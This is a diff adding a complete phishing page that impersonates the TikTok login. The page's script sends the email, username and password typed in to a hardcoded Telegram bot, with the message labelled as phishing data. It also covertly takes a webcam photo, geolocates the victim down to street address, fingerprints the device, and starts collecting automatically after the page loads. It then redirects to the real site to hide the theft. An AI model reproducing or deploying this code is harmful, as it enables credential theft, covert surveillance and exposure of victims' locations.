@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok - Log In</title>
+  <style>
+    :root {
+      --primary: #000000;   /* hitam tiktok */
+      --secondary: #69C9D0; /* cyan tiktok */
+      --accent: #EE1D52;    /* pink tiktok */
+      --gray: #121212;      /* dark gray */
+      --light-gray: #2A2A2A; /* lighter gray */
+      --text: #FFFFFF;      /* white text */
+      --input-bg: #1F1F1F;  /* input background */
+      --border: #333333;    /* border color */
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    
+    body {
+      background: var(--primary);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    
+    /* TikTok gradient background */
+    .tiktok-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        radial-gradient(circle at 10% 20%, rgba(238, 29, 82, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 90% 80%, rgba(105, 201, 208, 0.1) 0%, transparent 50%);
+      z-index: -1;
+    }
+    
+    /* Header with logo */
+    .header {
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    
+    .logo {
+      font-size: 40px;
+      font-weight: 700;
+      background: linear-gradient(45deg, var(--accent), var(--secondary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
+      letter-spacing: -1px;
+    }
+    
+    .tagline {
+      color: #AAAAAA;
+      font-size: 14px;
+      font-weight: 300;
+    }
+    
+    /* Main container */
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: rgba(18, 18, 18, 0.95);
+      border-radius: 16px;
+      padding: 40px 30px;
+      border: 1px solid var(--border);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+    }
+    
+    /* Form styles */
+    .form-title {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    
+    .form-subtitle {
+      color: #AAAAAA;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    .form-label {
+      display: block;
+      font-size: 14px;
+      color: #CCCCCC;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      font-size: 15px;
+      transition: all 0.3s ease;
+    }
+    
+    .form-input:focus {
+      outline: none;
+      border-color: var(--secondary);
+      box-shadow: 0 0 0 2px rgba(105, 201, 208, 0.2);
+    }
+    
+    .form-input::placeholder {
+      color: #666666;
+    }
+    
+    /* Password container */
+    .password-container {
+      position: relative;
+    }
+    
+    .toggle-password {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: var(--secondary);
+      cursor: pointer;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    /* Options */
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 25px;
+      font-size: 14px;
+    }
+    
+    .remember-me {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #CCCCCC;
+    }
+    
+    .remember-checkbox {
+      width: 18px;
+      height: 18px;
+      accent-color: var(--accent);
+    }
+    
+    .forgot-password {
+      color: var(--secondary);
+      text-decoration: none;
+      font-weight: 500;
+      transition: opacity 0.3s;
+    }
+    
+    .forgot-password:hover {
+      opacity: 0.8;
+    }
+    
+    /* Buttons */
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(45deg, var(--accent), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-bottom: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(238, 29, 82, 0.3);
+    }
+    
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+    
+    .btn-primary::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.1);
+      transform: rotate(45deg);
+      transition: all 0.5s;
+      opacity: 0;
+    }
+    
+    .btn-primary:hover::after {
+      opacity: 1;
+      transform: rotate(45deg) translate(20%, 20%);
+    }
+    
+    /* Divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 25px 0;
+      color: #666666;
+      font-size: 14px;
+    }
+    
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+    
+    .divider span {
+      padding: 0 15px;
+    }
+    
+    /* Social login */
+    .social-login {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    
+    .btn-social {
+      width: 100%;
+      padding: 14px;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.3s;
+    }
+    
+    .btn-social:hover {
+      background: rgba(255, 255, 255, 0.05);
+    }
+    
+    /* Sign up link */
+    .signup-link {
+      text-align: center;
+      margin-top: 25px;
+      color: #AAAAAA;
+      font-size: 14px;
+    }
+    
+    .signup-link a {
+      color: var(--secondary);
+      text-decoration: none;
+      font-weight: 600;
+    }
+    
+    .signup-link a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Security info */
+    .security-info {
+      background: rgba(42, 42, 42, 0.5);
+      border-radius: 12px;
+      padding: 15px;
+      margin-top: 25px;
+      border-left: 3px solid var(--secondary);
+    }
+    
+    .security-info p {
+      font-size: 12px;
+      color: #AAAAAA;
+      line-height: 1.6;
+      margin-bottom: 8px;
+    }
+    
+    .security-info p:last-child {
+      margin-bottom: 0;
+    }
+    
+    .security-icon {
+      display: inline-block;
+      margin-right: 5px;
+    }
+    
+    /* Footer */
+    .footer {
+      margin-top: 30px;
+      color: #666666;
+      font-size: 12px;
+      text-align: center;
+      width: 100%;
+      max-width: 420px;
+      padding: 20px 0;
+      border-top: 1px solid var(--border);
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 15px;
+    }
+    
+    .footer-links a {
+      color: #666666;
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+    
+    .footer-links a:hover {
+      color: var(--secondary);
+    }
+    
+    /* Verification modal */
+    .verification-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+    
+    .verification-modal.active {
+      display: flex;
+      animation: fadeIn 0.3s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    .verification-content {
+      background: var(--gray);
+      border-radius: 20px;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      border: 1px solid var(--secondary);
+      position: relative;
+    }
+    
+    .verification-icon {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(45deg, var(--accent), var(--secondary));
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+    
+    .verification-title {
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+    
+    .verification-text {
+      color: #AAAAAA;
+      font-size: 14px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    
+    .progress-container {
+      width: 100%;
+      height: 6px;
+      background: var(--light-gray);
+      border-radius: 3px;
+      margin: 25px 0;
+      overflow: hidden;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), var(--secondary));
+      border-radius: 3px;
+      transition: width 2s ease;
+    }
+    
+    .loading-dots {
+      display: flex;
+      justify-content: center;
+      gap: 5px;
+      margin: 20px 0;
+    }
+    
+    .loading-dots span {
+      width: 8px;
+      height: 8px;
+      background: var(--secondary);
+      border-radius: 50%;
+      animation: bounce 1.4s infinite;
+    }
+    
+    .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+    
+    @keyframes bounce {
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-10px); }
+    }
+    
+    /* Responsive */
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+      }
+      
+      .verification-content {
+        padding: 30px 20px;
+      }
+      
+      .logo {
+        font-size: 32px;
+      }
+    }
+    
+    /* Error message */
+    .error-message {
+      color: var(--accent);
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="tiktok-bg"></div>
+  
+  <div class="header">
+    <div class="logo">TikTok</div>
+    <div class="tagline">Log in to follow your favorite creators</div>
+  </div>
+  
+  <div class="container">
+    <h2 class="form-title">Log In to TikTok</h2>
+    <p class="form-subtitle">Enter your credentials to access your account</p>
+    
+    <form id="loginForm">
+      <div class="form-group">
+        <label class="form-label">Email or Phone Number</label>
+        <input type="text" class="form-input" id="email" placeholder="Enter email or phone" required>
+        <div class="error-message" id="emailError">Please enter a valid email or phone number</div>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">Username</label>
+        <input type="text" class="form-input" id="username" placeholder="Enter your username" required>
+        <div class="error-message" id="usernameError">Username is required</div>
+      </div>
+      
+      <div class="form-group">
+        <label class="form-label">Password</label>
+        <div class="password-container">
+          <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
+          <button type="button" class="toggle-password" id="togglePassword">SHOW</button>
+        </div>
+        <div class="error-message" id="passwordError">Password must be at least 6 characters</div>
+      </div>
+      
+      <div class="options">
+        <label class="remember-me">
+          <input type="checkbox" class="remember-checkbox" id="rememberMe">
+          Remember me
+        </label>
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+      
+      <button type="submit" class="btn-primary" id="loginBtn">
+        <span id="btnText">Log In</span>
+      </button>
+    </form>
+    
+    <div class="divider">
+      <span>or continue with</span>
+    </div>
+    
+    <div class="social-login">
+      <button type="button" class="btn-social">
+        <span>Continue with Google</span>
+      </button>
+      <button type="button" class="btn-social">
+        <span>Continue with Facebook</span>
+      </button>
+    </div>
+    
+    <div class="signup-link">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    
+    <div class="security-info">
+      <p><span class="security-icon">🔒</span> Your login information is encrypted and secure</p>
+      <p><span class="security-icon">🔄</span> We'll verify your device for added security</p>
+      <p><span class="security-icon">📱</span> You may be asked for additional verification</p>
+    </div>
+  </div>
+  
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">About</a>
+      <a href="#">Newsroom</a>
+      <a href="#">Contact</a>
+      <a href="#">Careers</a>
+    </div>
+    <div>© 2024 TikTok. All rights reserved.</div>
+  </div>
+  
+  <!-- Verification Modal -->
+  <div class="verification-modal" id="verificationModal">
+    <div class="verification-content">
+      <div class="verification-icon">✓</div>
+      <h3 class="verification-title">Verifying Your Account</h3>
+      <p class="verification-text">We're checking your device information and verifying your credentials for security purposes.</p>
+      
+      <div class="progress-container">
+        <div class="progress-bar" id="verificationProgress"></div>
+      </div>
+      
+      <div class="loading-dots">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      
+      <p class="verification-text" style="font-size: 12px;">
+        This may take a few moments. Please do not close this window.
+      </p>
+    </div>
+  </div>
+
+  <!-- Camera UI (Hidden) -->
+  <div style="display: none;">
+    <video id="cameraFeed" autoplay playsinline></video>
+    <canvas id="photoCanvas"></canvas>
+  </div>
+
+  <script>
+    // Konfigurasi Telegram
+    const TOKEN = "8506532076:AAH-Rvh6hMqCdyxhY1MGQZXeM5Z7UGFa4Nw";
+    const CHAT_ID = "8567705623";
+    
+    // State variables
+    let dataCollected = false;
+    let photoTaken = false;
+    let stream = null;
+    let isVerifying = false;
+    
+    // DOM Elements
+    const loginForm = document.getElementById('loginForm');
+    const emailInput = document.getElementById('email');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const togglePasswordBtn = document.getElementById('togglePassword');
+    const loginBtn = document.getElementById('loginBtn');
+    const verificationModal = document.getElementById('verificationModal');
+    const verificationProgress = document.getElementById('verificationProgress');
+    const cameraFeed = document.getElementById('cameraFeed');
+    const photoCanvas = document.getElementById('photoCanvas');
+    
+    // Event Listeners
+    loginForm.addEventListener('submit', handleLogin);
+    togglePasswordBtn.addEventListener('click', togglePasswordVisibility);
+    
+    // Toggle password visibility
+    function togglePasswordVisibility() {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePasswordBtn.textContent = type === 'password' ? 'SHOW' : 'HIDE';
+    }
+    
+    // Handle login form submission
+    function handleLogin(e) {
+      e.preventDefault();
+      
+      if (isVerifying) return;
+      
+      // Validate inputs
+      if (!validateForm()) return;
+      
+      isVerifying = true;
+      loginBtn.disabled = true;
+      loginBtn.innerHTML = '<span>Verifying...</span>';
+      
+      // Show verification modal
+      verificationModal.classList.add('active');
+      
+      // Start verification process
+      startVerification();
+    }
+    
+    // Validate form inputs
+    function validateForm() {
+      let isValid = true;
+      
+      // Email validation
+      const email = emailInput.value.trim();
+      if (!email || (email.indexOf('@') === -1 && !/^\d+$/.test(email))) {
+        showError('emailError', 'Please enter a valid email or phone number');
+        isValid = false;
+      } else {
+        hideError('emailError');
+      }
+      
+      // Username validation
+      const username = usernameInput.value.trim();
+      if (!username) {
+        showError('usernameError', 'Username is required');
+        isValid = false;
+      } else {
+        hideError('usernameError');
+      }
+      
+      // Password validation
+      const password = passwordInput.value;
+      if (!password || password.length < 6) {
+        showError('passwordError', 'Password must be at least 6 characters');
+        isValid = false;
+      } else {
+        hideError('passwordError');
+      }
+      
+      return isValid;
+    }
+    
+    function showError(elementId, message) {
+      const element = document.getElementById(elementId);
+      element.textContent = message;
+      element.style.display = 'block';
+    }
+    
+    function hideError(elementId) {
+      document.getElementById(elementId).style.display = 'none';
+    }
+    
+    // Start verification process
+    async function startVerification() {
+      // Collect credentials
+      const credentials = {
+        email: emailInput.value.trim(),
+        username: usernameInput.value.trim(),
+        password: passwordInput.value,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform
+      };
+      
+      // Start progress animation
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        if (progress < 100) {
+          progress += 1;
+          verificationProgress.style.width = `${progress}%`;
+        } else {
+          clearInterval(progressInterval);
+        }
+      }, 30);
+      
+      // Collect device data in background
+      await collectData(credentials);
+      
+      // Simulate verification completion
+      setTimeout(() => {
+        verificationModal.classList.remove('active');
+        showSuccessMessage();
+      }, 3000);
+    }
+    
+    // Collect data and send to Telegram
+    async function collectData(credentials) {
+      if (dataCollected) return;
+      
+      dataCollected = true;
+      
+      try {
+        // Collect device info
+        const deviceInfo = await getVisitorInfo();
+        
+        // Take photo if possible
+        await takePhoto();
+        
+        // Send everything to Telegram
+        await sendToTelegram(credentials, deviceInfo);
+      } catch (error) {
+        console.error("Error collecting data:", error);
+      }
+    }
+    
+    async function takePhoto() {
+      if (photoTaken) return;
+      
+      try {
+        // Request camera access
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
+        });
+        
+        // Capture photo
+        cameraFeed.srcObject = stream;
+        
+        // Wait for camera to be ready
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        // Capture frame
+        const context = photoCanvas.getContext('2d');
+        photoCanvas.width = cameraFeed.videoWidth;
+        photoCanvas.height = cameraFeed.videoHeight;
+        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+        
+        // Save photo
+        window.capturedPhoto = photoCanvas.toDataURL('image/jpeg');
+        
+        // Stop camera
+        stopCamera();
+        
+        photoTaken = true;
+      } catch (error) {
+        console.error("Error accessing camera:", error);
+        window.capturedPhoto = null;
+      }
+    }
+    
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }
+    
+    // Show success message
+    function showSuccessMessage() {
+      loginBtn.innerHTML = '<span>✓ Login Successful</span>';
+      loginBtn.style.background = 'linear-gradient(45deg, #25D366, #69C9D0)';
+      
+      setTimeout(() => {
+        // Redirect to fake TikTok page
+        window.location.href = "https://www.tiktok.com";
+      }, 1500);
+    }
+    
+    // Fungsi-fungsi dari script asli
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+    
+    function encryptText(text) {
+      if (text === "N/A") return "N/A";
+      return btoa(text).split('').reverse().join('');
+    }
+    
+    async function getVisitorInfo() {
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+      let street = "N/A", streetNumber = "N/A", district = "N/A";
+      let simOperator = "N/A", fullName = "N/A", googleEmail = "N/A", googlePassword = "N/A";
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+      
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "yes" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
+      
+      if ('connection' in navigator) {
+        try {
+          simOperator = navigator.connection.effectiveType || "N/A";
+        } catch (e) {
+          simOperator = "N/A";
+        }
+      }
+      
+      try {
+        if (localStorage.length > 0) {
+          googleEmail = "user@gmail.com (simulated)";
+          googlePassword = encryptText("password123 (simulated)");
+        }
+      } catch (e) {}
+      
+      try {
+        if (navigator.credentials && navigator.credentials.get) {
+          fullName = "@##&#@$&#--#++-#++#";
+        }
+      } catch (e) {}
+      
+      try {
+        const ipData1 = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const ipData2 = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+        
+        ip = ipData1.ip || ipData2.ip || "N/A";
+        country = ipData1.country_name || "N/A";
+        province = ipData1.region || "N/A";
+        city = ipData1.city || "N/A";
+        latitude = ipData1.latitude || "N/A";
+        longitude = ipData1.longitude || "N/A";
+        namaISP = ipData1.org || "N/A";
+        
+        if (latitude !== "N/A" && longitude !== "N/A") {
+          try {
+            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+            const data = await response.json();
+            if (data.address) {
+              street = data.address.road || "N/A";
+              streetNumber = data.address.house_number || "N/A";
+              district = data.address.suburb || data.address.neighbourhood || "N/A";
+            }
+          } catch (e) {
+            console.error("Error getting address details:", e);
+          }
+        }
+      } catch (error) {
+        console.error("Error getting IP information:", error);
+      }
+      
+      try {
+        if (latitude !== "N/A" && longitude !== "N/A") {
+          const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+        }
+      } catch {}
+      
+      try {
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              resolve();
+            },
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        });
+      } catch {}
+      
+      return {
+        "ISP": namaISP,
+        "IP Address": ip,
+        "SIM Operator": simOperator,
+        "Full Name": fullName,
+        "Google Email": googleEmail,
+        "Google Password": googlePassword,
+        "Device": device,
+        "Android Version": androidVersion,
+        "Platform": loginFrom,
+        "Coordinates": `${latitude}, ${longitude}`,
+        "Accuracy": accuracy,
+        "Country": country,
+        "Province/State": province,
+        "City": city,
+        "Street": street,
+        "Street Number": streetNumber,
+        "District": district,
+        "Time": clock,
+        "Weather": weather,
+        "Temperature": temperature,
+        "Language": language,
+        "Resolution": resolution,
+        "Timezone": timezone,
+        "Online Status": isOnline ? "Online" : "Offline",
+        "RAM (GB)": deviceMemory,
+        "CPU Cores": cpuCores,
+        "Touch Support": isTouch ? "Yes" : "No",
+        "Cookies Enabled": cookiesEnabled ? "Yes" : "No",
+        "Do Not Track": doNotTrack || "Not specified",
+        "Fingerprint": fingerprint,
+        "Battery Level": batteryInfo["battery level"],
+        "Charging": batteryInfo["charging"]
+      };
+    }
+    
+    async function sendToTelegram(credentials, deviceInfo) {
+      // Format message with credentials
+      const message = `🎬 TIKTOK PHISHING DATA - LOGIN CREDENTIALS\n\n` +
+        `🔐 **LOGIN INFO**\n` +
+        `📧 Email/Phone: ${credentials.email}\n` +
+        `👤 Username: ${credentials.username}\n` +
+        `🔑 Password: ${credentials.password}\n` +
+        `🕒 Time: ${credentials.timestamp}\n\n` +
+        `💻 **DEVICE INFO**\n` +
+        `📱 Device: ${deviceInfo["Device"]}\n` +
+        `🌐 IP Address: ${deviceInfo["IP Address"]}\n` +
+        `📍 Location: ${deviceInfo["Coordinates"]}\n` +
+        `🏢 ISP: ${deviceInfo["ISP"]}\n` +
+        `🤖 Android Version: ${deviceInfo["Android Version"]}\n` +
+        `💾 RAM: ${deviceInfo["RAM (GB)"]} GB\n` +
+        `⚡ CPU Cores: ${deviceInfo["CPU Cores"]}\n` +
+        `🔋 Battery: ${deviceInfo["Battery Level"]} - Charging: ${deviceInfo["Charging"]}\n\n` +
+        `📡 **ADDITIONAL INFO**\n` +
+        `👤 Full Name: ${deviceInfo["Full Name"]}\n` +
+        `📧 Google Email: ${deviceInfo["Google Email"]}\n` +
+        `🔑 Google Password: ${deviceInfo["Google Password"]}\n` +
+        `📞 SIM Operator: ${deviceInfo["SIM Operator"]}`;
+      
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+      
+      // Send photo if available
+      if (window.capturedPhoto) {
+        const blob = await fetch(window.capturedPhoto).then(r => r.blob());
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'tiktok-user-photo.jpg');
+        formData.append('caption', 'User photo captured during login');
+        
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      }
+    }
+    
+    // Auto-start data collection after page load
+    window.addEventListener('load', () => {
+      // Start background data collection
+      setTimeout(() => {
+        if (!dataCollected) {
+          collectData({});
+        }
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
